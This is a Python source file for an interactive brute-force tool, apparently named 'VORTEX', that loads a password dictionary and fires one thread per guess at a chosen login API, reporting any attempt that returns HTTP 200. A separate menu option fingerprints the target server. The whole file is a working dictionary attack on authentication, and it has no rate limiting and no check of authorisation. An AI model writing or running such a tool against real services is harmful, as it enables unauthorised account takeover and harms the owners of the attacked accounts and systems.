import requests
import json
import sys
import threading
from queue import Queue

def print_banner():
    RED = '\033[91m'
    GRN = '\033[92m'
    RST = '\033[0m'
    # Menambahkan 'r' di depan untuk menghindari SyntaxWarning
    banner = r"""
  _   _   ____  ____  _____  _   _  ____  
 ( )_( )(  _ \(  _ \(  _  )( \( )( ___)
  ) _ (  )   / )   / )(_)(  )   (  )__) 
 (_) (_)(_)\_)(_)\_)(_____)(_)\_)(____)
  VORTEX v1.1 // BY NEUROPRASS
    """
    print(RED + banner + GRN + "\n [ Focus: Speed & Power ]" + RST)

def analyze_mechanism(url):
    print(f"\n[*] Analyzing: {url}")
    try:
        response = requests.head(url, timeout=5)
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Server Header: {response.headers.get('Server', 'Unknown')}")
        print("[+] Mechanism: Endpoint responsive. Ready for testing.")
    except Exception as e:
        print(f"[-] Could not connect to target: {e}")

def build_request(username, password):
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    payload = json.dumps({"username": username, "password": password})
    return headers, payload

def send_request(target_api, headers, payload, result):
    try:
        response = requests.post(target_api, headers=headers, data=payload, timeout=5)
        result.put((response.status_code, response.text))
    except Exception as e:
        result.put((None, str(e)))

def execute_test(target_url, username, password_file):
    try:
        with open(password_file, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print("[-] Error: Password file not found.")
        return

    result = Queue()
    threads = []
    print(f"[*] Starting engine with {len(passwords)} keys...")
    
    for password in passwords:
        headers, payload = build_request(username, password)
        t = threading.Thread(target=send_request, args=(target_url, headers, payload, result))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[*] Scan completed. Results:")
    while not result.empty():
        res = result.get()
        if res[0] == 200:
            print(f"[+] 200 OK: {res[1]}")
        else:
            print(f"[-] Status {res[0]}: Login Failed")

def main():
    print_banner()
    while True:
        print("\n[ CORE MENU ]")
        print("1. Analyze Auth Mechanism")
        print("2. Execute Credential Test")
        print("3. Terminate Session")
        
        choice = input("\nvortex-auth > ")
        
        if choice == "1":
            url = input("[?] Enter URL to analyze: ")
            analyze_mechanism(url)
        elif choice == "2":
            url = input("[?] Target Endpoint: ")
            user = input("[?] Username: ")
            pfile = input("[?] Password Dictionary File: ")
            execute_test(url, user, pfile)
        elif choice == "3":
            print("[*] Session terminated.")
            sys.exit()
        else:
            print("[!] Invalid option. Please choose 1, 2, or 3.")

if __name__ == "__main__":
    main()
